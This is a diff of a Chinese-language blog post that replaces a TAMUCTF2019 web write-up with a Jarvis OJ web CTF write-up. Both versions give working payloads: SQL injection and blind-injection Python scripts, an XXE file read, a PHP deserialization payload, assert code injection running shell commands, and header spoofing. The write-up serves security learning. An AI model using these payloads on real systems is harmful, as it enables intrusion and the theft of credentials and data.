@@ -6,33 +6,62 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>TAMUCTF2019 web writeup | GAP&#39;s blog</title>
+  <title>Jarvis OJ web writeup | GAP&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Not Another SQLi Challenge万能密码 payload:username=admin&amp;amp;password=1&amp;#39;or 1=1# Buckets针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为http://bucketname.s3.amazonaws.com 也就是修改url为http://tamuctf.s3.amazona">
+  <meta name="description" content="1. Login在响应头中得到了hint也就是说我们post传入的pass经过了md5加密，我们都知道这种登陆问题最常见的payload就是类似于admin&amp;#39;or 1=1#这种，同理我们只要能找到一个md5加密后符合这种类似格式的语句即可，在实验吧当中也有一道相似的题目，最后的payload为ffifdyop，这个字符串经过md5加密后的结果为符合上文提到的格式要求，提交后得到flag。">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="TAMUCTF2019 web writeup">
-<meta property="og:url" content="http://yoursite.com/2019/03/29/TAMUCTF2019 web writeup/index.html">
+<meta property="og:title" content="Jarvis OJ web writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/03/Jarvis OJ web writeup/index.html">
 <meta property="og:site_name" content="GAP&#39;s blog">
-<meta property="og:description" content="Not Another SQLi Challenge万能密码 payload:username=admin&amp;amp;password=1&amp;#39;or 1=1# Buckets针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为http://bucketname.s3.amazonaws.com 也就是修改url为http://tamuctf.s3.amazona">
+<meta property="og:description" content="1. Login在响应头中得到了hint也就是说我们post传入的pass经过了md5加密，我们都知道这种登陆问题最常见的payload就是类似于admin&amp;#39;or 1=1#这种，同理我们只要能找到一个md5加密后符合这种类似格式的语句即可，在实验吧当中也有一道相似的题目，最后的payload为ffifdyop，这个字符串经过md5加密后的结果为符合上文提到的格式要求，提交后得到flag。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/3.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190305221029390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/5.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/6.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/7.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/8.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/9.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/10.png">
-<meta property="og:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/11.png">
-<meta property="og:updated_time" content="2019-03-29T14:03:17.666Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/10.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/11.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/12.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/13.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/14.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/14-2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/15.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/16.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/17.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/18.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/19.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/19-2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/20.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/21.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/22.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/23.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/24.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/25.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/26.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/27.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/28.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/29.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/30.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/31.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/32.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/33.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/34.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/35.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/36.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/37.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/38.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/39.png">
+<meta property="og:updated_time" content="2019-04-03T09:42:47.468Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="TAMUCTF2019 web writeup">
-<meta name="twitter:description" content="Not Another SQLi Challenge万能密码 payload:username=admin&amp;amp;password=1&amp;#39;or 1=1# Buckets针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为http://bucketname.s3.amazonaws.com 也就是修改url为http://tamuctf.s3.amazona">
-<meta name="twitter:image" content="http://yoursite.com/2019/03/29/TAMUCTF2019%20web%20writeup/1.png">
+<meta name="twitter:title" content="Jarvis OJ web writeup">
+<meta name="twitter:description" content="1. Login在响应头中得到了hint也就是说我们post传入的pass经过了md5加密，我们都知道这种登陆问题最常见的payload就是类似于admin&amp;#39;or 1=1#这种，同理我们只要能找到一个md5加密后符合这种类似格式的语句即可，在实验吧当中也有一道相似的题目，最后的payload为ffifdyop，这个字符串经过md5加密后的结果为符合上文提到的格式要求，提交后得到flag。">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/03/Jarvis%20OJ%20web%20writeup/4.png">
   
     <link rel="alternative" href="/atom.xml" title="GAP&#39;s blog" type="application/atom+xml">
   
@@ -154,35 +183,79 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-TAMUCTF2019 web writeup" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Jarvis OJ web writeup" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      TAMUCTF2019 web writeup
+      Jarvis OJ web writeup
     </h1>
   
 
         
-        <a href="/2019/03/29/TAMUCTF2019 web writeup/" class="archive-article-date">
-  	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
+        <a href="/2019/04/03/Jarvis OJ web writeup/" class="archive-article-date">
+  	<time datetime="2019-04-03T08:57:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-03</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Not-Another-SQLi-Challenge"><a href="#Not-Another-SQLi-Challenge" class="headerlink" title="Not Another SQLi Challenge"></a>Not Another SQLi Challenge</h2><p>万能密码 payload:<code>username=admin&amp;password=1&#39;or 1=1#</code></p>
-<h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><p>针对BUCKET的探针，使用浏览器打开Amazon提供的自动分配的S3 URL，格式为<a href="http://bucketname.s3.amazonaws.com" target="_blank" rel="noopener">http://bucketname.s3.amazonaws.com</a> 也就是修改url为<a href="http://tamuctf.s3.amazonaws.com/" target="_blank" rel="noopener">http://tamuctf.s3.amazonaws.com/</a> 获得一个不受访问权限的bucket，找到关键文档Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt，获得flag。<br>学习资料：<a href="https://www.freebuf.com/articles/web/135313.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135313.html</a></p>
-<h2 id="Science"><a href="#Science" class="headerlink" title="Science!"></a>Science!</h2><p>直接给出提示flask,判断是ssti模板注入。测试注入点Chemical1,payload1.<code></code>，注入存在<br><img src="/2019/03/29/TAMUCTF2019 web writeup/1.png" alt="在这里插入图片描述"></p>
-<h2 id="Robots-Rule"><a href="#Robots-Rule" class="headerlink" title="Robots Rule"></a>Robots Rule</h2><p>提到robots，查看robots.txt<br><img src="/2019/03/29/TAMUCTF2019 web writeup/2.png" alt="在这里插入图片描述"><br>想让我们伪造成一个googlebot,百度一个googlebot的useragent<br><img src="/2019/03/29/TAMUCTF2019 web writeup/3.png" alt="在这里插入图片描述"><br>改一下user-agent:<code>Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;)</code><br><img src="https://img-blog.csdnimg.cn/20190305221029390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N0ZXBvbmU0d2FyZA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="Many-Gig’ems-to-you"><a href="#Many-Gig’ems-to-you" class="headerlink" title="Many Gig’ems to you!"></a>Many Gig’ems to you!</h2><p>一个拼接的flag<br><img src="/2019/03/29/TAMUCTF2019 web writeup/4.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/TAMUCTF2019 web writeup/5.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/TAMUCTF2019 web writeup/6.png" alt="在这里插入图片描述"><br>得到flag:<code>gigem{flag_in_source_and_}</code></p>
-<h2 id="Bird-Box-Challenge"><a href="#Bird-Box-Challenge" class="headerlink" title="Bird Box Challenge"></a>Bird Box Challenge</h2><p>开始的时候，使用了<code>-1&#39;union select database()#</code>等一系列的语句读出库名，表名等一系列数据，但是都没有什么价值。库名：SqliDB,表名：Search,列名：items,查询内容：Eggs,Trucks,Aggies<br>最后google了一下writeup，看到flag藏到了user()当中，真的是没有想到……<br>payload:<code>-1&#39;union select user()#</code><br><img src="/2019/03/29/TAMUCTF2019 web writeup/7.png" alt="在这里插入图片描述"></p>
-<h2 id="1337-Secur1ty"><a href="#1337-Secur1ty" class="headerlink" title="1337 Secur1ty"></a>1337 Secur1ty</h2><p>开始的时候注册完就直接点开了message，是一个类似于guestbook的界面，下意识地反应这应该是一个关于xss的问题，但是邮件发不出去……,用burp抓取登陆的界面，看到了Cookie当中的userid和secret，userid应当是修改为1了,但是secret却不知道应该修改为何值。<br><img src="/2019/03/29/TAMUCTF2019 web writeup/8.png" alt="在这里插入图片描述"><br>此处找到了注入点id,进行bool类型的盲注</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">ans=&apos;&apos;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in range(37,127):</span><br><span class="line">        #url=&quot;http://web6.tamuctf.com/message?id=1%27+and+ascii(substr((select+schema_name+from+information_schema.schemata%20limit+0%2C1)%2C&quot;+str(i)+&quot;%2C1))%3D&quot;+str(j)+&quot;+and+1%3D%271&quot;</span><br><span class="line">        #url=&quot;http://web6.tamuctf.com/message?id=1%27%20and%20ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%27Users%27limit%209,1),&quot;+str(i)+&quot;,1))%3D&quot;+str(j)+&quot;%20and%201=%271&quot;</span><br><span class="line">        #url=&quot;http://web6.tamuctf.com/message?id=1%27%20and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%202,1),&quot;+str(i)+&quot;,1))%3D&quot;+str(j)+&quot;%20and%201=%271&quot;</span><br><span class="line">        url=&quot;http://web6.tamuctf.com/message?id=1%27%20and ascii(substr((select Secret from Users limit 0,1),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot; and 1=&apos;1&quot;</span><br><span class="line">        c=s.get(url)</span><br><span class="line">        if &apos;Bob&apos; in c.text:</span><br><span class="line">            ans=ans+chr(j)</span><br><span class="line">            print(&apos;ans&apos;,ans)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/03/29/TAMUCTF2019 web writeup/9.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/TAMUCTF2019 web writeup/10.png" alt="在这里插入图片描述"><br>burp修改一下cookie，得到flag。<br><img src="/2019/03/29/TAMUCTF2019 web writeup/11.png" alt="在这里插入图片描述"></p>
+        <h2 id="1-Login"><a href="#1-Login" class="headerlink" title="1. Login"></a>1. Login</h2><p>在响应头中得到了hint<br><img src="/2019/04/03/Jarvis OJ web writeup/4.png" alt="在这里插入图片描述"><br>也就是说我们post传入的pass经过了md5加密，我们都知道这种登陆问题最常见的payload就是类似于<code>admin&#39;or 1=1#</code>这种，同理我们只要能找到一个md5加密后符合这种类似格式的语句即可，在实验吧当中也有一道相似的题目，最后的payload为<code>ffifdyop</code>，这个字符串经过md5加密后的结果为<br><img src="/2019/04/03/Jarvis OJ web writeup/5.png" alt="在这里插入图片描述"><br>符合上文提到的格式要求，提交后得到flag。</p>
+<h2 id="2-LOCALHOST"><a href="#2-LOCALHOST" class="headerlink" title="2. LOCALHOST"></a>2. LOCALHOST</h2><p>burp抓包后添加X-Forwarded-For: 127.0.0.1，得到flag。</p>
+<h2 id="3-PORT51"><a href="#3-PORT51" class="headerlink" title="3. PORT51"></a>3. PORT51</h2><p>这题不知道怎么搞得，使用了curl指令用51端口进行访问也没有得到flag…<br><img src="/2019/04/03/Jarvis OJ web writeup/6.png" alt="在这里插入图片描述"><br><img src="/2019/04/03/Jarvis OJ web writeup/7.png" alt="在这里插入图片描述"></p>
+<h2 id="4-神盾局的秘密"><a href="#4-神盾局的秘密" class="headerlink" title="4. 神盾局的秘密"></a>4. 神盾局的秘密</h2><p>右键查看元素，看到图片指向了一个包含着任意文件读取的url<br><img src="/2019/04/03/Jarvis OJ web writeup/1.png" alt="在这里插入图片描述"><br>访问一下看看<br><img src="/2019/04/03/Jarvis OJ web writeup/2.png" alt="在这里插入图片描述"><br>而且可以注意到<code>showing.php?img=一个base64加密的文件名</code>，我们尝试一下能不能直接读取<code>flag.php</code>,payload:<code>showing.php?img=ZmxhZy5waHA=</code><br><img src="/2019/04/03/Jarvis OJ web writeup/8.png" alt="在这里插入图片描述"><br>并不可以……但是我们看到了网页是采取<code>readfile()</code>方法对我们的输入进行处理，也就印证了我们对于任意文件读取类型漏洞的判断，既然没有<code>flag.php</code>,那么再尝试访问一下<code>index.php</code>,payload=<code>showing.php?img=aW5kZXgucGhw</code><br>得到<br><img src="/2019/04/03/Jarvis OJ web writeup/9.png" alt="在这里插入图片描述"><br>也就是说需要我们以get的方式传入一个名为class的变量，其内容是一个Shield类，并且会对其进行反序列化操作。但Shield类的构造方式我们未知，再去访问一下<code>shield.php</code>,payload:<code>showimg.php?img=c2hpZWxkLnBocA==</code><br>可以得到<br><img src="/2019/04/03/Jarvis OJ web writeup/3.png" alt="在这里插入图片描述"><br>稍微整理一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in pctf.php</span><br><span class="line">class Shield &#123;</span><br><span class="line">	public $file;</span><br><span class="line">	function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">		$this -&gt;file = $filename;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	function readfile() &#123;</span><br><span class="line">		if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) &#123;</span><br><span class="line">			return @file_get_contents($this-&gt;file);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>首先是flag存在于<code>pctf.php</code>当中，然后是Shield类的构造，需要我们传入一个名为<code>file</code>的参数。类中还包含了一个<code>readfile()</code>方法，如果我们传入的file当中不包含<code>..</code>,<code>/</code>,<code>\\</code>则会读取出file的内容，我们直接传入存在flag的<code>pctf.php</code>。<br><img src="/2019/04/03/Jarvis OJ web writeup/10.png" alt="在这里插入图片描述"><br>最后的payload为<code>index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</code>得到flag。</p>
+<h2 id="6-IN-A-Mess"><a href="#6-IN-A-Mess" class="headerlink" title="6. IN A Mess"></a>6. IN A Mess</h2><p>f12查看元素得到提示。<br><img src="/2019/04/03/Jarvis OJ web writeup/11.png" alt="在这里插入图片描述"><br>访问index.phps<br><img src="/2019/04/03/Jarvis OJ web writeup/12.png" alt="在这里插入图片描述"><br>得到了index.php的源码。由题意可知需要我们传入三个变量，分别为<code>$id</code>,<code>$a</code>,<code>$b</code>。首先是对<code>$id</code>变量的处理，<code>$_GET[&#39;id&#39;]</code>的返回值不可以为0但是<code>$id==0</code>的返回值需要为<code>true</code>，注意到这里用到了连续两个等于号，可以利用php弱类型比较进行绕过，只需要传入一个字符串(string会在进行比较时自动转换为int类型的0)。然后是<code>$a</code>中不能出现<code>&#39;.&#39;</code>，<code>file_get_contents()</code>函数是用于将文件的内容读入到一个字符串中的首选方法。利用<code>php://input</code>伪协议可以向<code>$a</code>写入指定的内容(1112 is a nice lab!)。最后对于变量<code>$b</code>,长度需要大于5，然后将<code>111</code>和<code>$b</code>的第一个字符拼接起来(eregi()函数在一个字符串搜索指定的模式的字符串),但是<code>$b</code>的第一位又不可以是4，可以联系eregi()函数的%00截断的性质，当eregi()匹配到%00是便不再向下匹配了，如果我们直接传入一个<code>%00</code>开头的数，则eregi当中的匹配便成为了eregi(“111”,”1112”)符合要求,最后的payload为:<br><img src="/2019/04/03/Jarvis OJ web writeup/13.png" alt="在这里插入图片描述"><br>访问一下给出的地址，可以看出是一个sql注入的题目。过滤了空格<code>（/*1*/方式绕过）</code>,union和select使用双写绕过。最后的注入语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(seselectlect/*1*/group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database())%23</span><br><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(seselectlect/*1*/group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*12*/table_name=0x636f6e74656e74)%23</span><br><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(seselectlect/*1*/context/*1*/frfromom/*1*/content)%23</span><br></pre></td></tr></table></figure>
+<h2 id="7-admin"><a href="#7-admin" class="headerlink" title="7. admin"></a>7. admin</h2><p>进入题目后只给出了一行Hello World，查看元素和响应头之后并没有得到提示，考虑源码泄露和robots.txt的问题，访问robots.txt，得到提示<br><img src="/2019/04/03/Jarvis OJ web writeup/14.png" alt="在这里插入图片描述"><br>访问admin_s3cr3t.php，得到了一个假flag…<br><img src="/2019/04/03/Jarvis OJ web writeup/14-2.png" alt="在这里插入图片描述"><br>看一下响应头<br><img src="/2019/04/03/Jarvis OJ web writeup/15.png" alt="在这里插入图片描述"><br>burp抓包修改一下cookie:<code>admin=1</code>，得到flag。</p>
+<h2 id="8-api调用-XEE攻击"><a href="#8-api调用-XEE攻击" class="headerlink" title="8. api调用(XEE攻击)"></a>8. api调用(XEE攻击)</h2><p>一道考察XEE攻击的题目，先了解一下什么是XEE漏洞，XEE漏洞就是XML外部实体注入(XML External Entity)，首先要做的是测试一下我们发送的XML内容能否被应用程序所解析，修改一下<code>Content-Type: application/xml</code>，然后定义一个名为’b’外部实体，其内容为’hello’。</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY b &quot;hello&quot;&gt;]&gt;
+&lt;c&gt;&amp;b;&lt;/c&gt;
+</code></pre><p><img src="/2019/04/03/Jarvis OJ web writeup/16.png" alt="在这里插入图片描述"><br>看到了我们发送的内容已经被解析了，也就印证了XEE漏洞的存在。XML实体中的关键字’SYSTEM’会令XML解析器从url中读取内容，我们就可以利用XML解析器去访问攻击者指定的资源后得到flag。<br>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+<p>资料来源：</p>
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/web/126788.html#" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/126788.html#</a></p>
+</blockquote>
+<h2 id="9-babyphp"><a href="#9-babyphp" class="headerlink" title="9. babyphp"></a>9. babyphp</h2><p><img src="/2019/04/03/Jarvis OJ web writeup/17.png" alt="在这里插入图片描述"><br>在about页面当中得到了提示，题目可能涉及git源码泄露的问题，使用工具githack进行探测，在cmd中输入指令<br><img src="/2019/04/03/Jarvis OJ web writeup/18.png" alt="在这里插入图片描述"><br>得到源码<br><img src="/2019/04/03/Jarvis OJ web writeup/19.png" alt="在这里插入图片描述"><br>查看index.php的源码，找到了关键语句。<br><img src="/2019/04/03/Jarvis OJ web writeup/19-2.png" alt="在这里插入图片描述"><br>我们可以利用assert的任意代码执行漏洞对flag.php的内容进行读取。观察语句<code>assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</code>，其中<code>$file</code>的内容是由用户进行输入的，如果我们的输入为<code>&#39;）</code>开头的话，便会使得<code>file_exists（&#39;</code>语句闭合，之后我们便可以进行恶意代码的执行，payload:<code>?page=&#39;) or print_r(file_get_contents(&#39;templates/flag.php&#39;));%23</code>或者<code>?page=&#39;) or system(&quot;cat templates/flag.php&quot;);%23</code>，有一点需要注意的是在对语句进行闭合的时候使用<code>#</code>是无效的，可能是因为不被解析的原因，直接使用<code>%23</code>就可以了。</p>
+<h2 id="10-Simple-Injection"><a href="#10-Simple-Injection" class="headerlink" title="10. Simple Injection"></a>10. Simple Injection</h2><p>一道考察sql注入的题目，值得注意的是对空格的过滤，可以使用<code>/*1*/</code>进行绕过，然后就是普通的bool类型盲注了，直接贴脚本了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">c=s.get(url)</span><br><span class="line">key=&apos;&apos;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(27,137):</span><br><span class="line">        #ans=&quot;admin&apos;=&apos;0&apos;||ascii(substr((select/*1*/table_name/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema=database()limit/*1*/1,1),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;#&quot;</span><br><span class="line">        ans=&quot;admin&apos;=&apos;0&apos;||ascii(substr((select/*1*/column_name/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name=&apos;admin&apos;limit/*1*/0,1),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;#&quot;</span><br><span class="line">        #ans=&quot;admin&apos;=&apos;0&apos;||ascii(substr((select/*1*/password/*1*/from/*1*/admin/*1*/limit/*1*/0,1),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;#&quot;</span><br><span class="line">        payload=&#123;&apos;username&apos;:ans,&apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">        c=s.post(url,payload)</span><br><span class="line">        if &apos;密码错误&apos; in c.text:</span><br><span class="line">            key=key+chr(j)</span><br><span class="line">            print(key)</span><br></pre></td></tr></table></figure>
+<p>之后得到了:</p>
+<pre><code>table_name:admin
+column_name:id username password
+password:334cfb59c9d74849801d5acdcfdaadc3
+将passwordMD5解密后得到:eTAloCrEP
+</code></pre><p>使用密码以admin身份登陆后得到flag。</p>
